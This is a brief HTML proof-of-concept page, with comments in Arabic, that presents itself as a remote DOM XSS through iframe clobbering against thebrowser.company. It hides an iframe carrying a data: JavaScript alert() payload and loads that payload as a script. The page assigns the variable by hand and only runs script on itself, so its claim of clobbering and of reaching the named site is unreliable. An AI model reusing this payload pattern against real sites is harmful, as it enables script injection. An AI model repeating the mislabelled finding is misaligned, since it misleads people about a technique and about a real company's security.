<!-- PoC HTML Page to Trigger Remote DOM XSS via iframe clobbering -->
<!DOCTYPE html>
<html>
<head>
  <title>Remote DOM XSS PoC</title>
</head>
<body>
  <h2>Testing DOM Clobbering on thebrowser.company</h2>

  <iframe 
    id="my_script" 
    name="src" 
    src="data:text/javascript,alert('Remote DOM XSS!')" 
    style="display:none">
  </iframe>

  <script>
    // محاولة ربط العنصر مع window
    window.my_script = document.getElementById('my_script');

    // إنشاء عنصر سكربت يشير إلى iframe.src
    let s = document.createElement('script');
    s.src = my_script.src; // المرجو أن يكون "data:text/javascript,..."
    document.body.appendChild(s);
  </script>
</body>
</html>
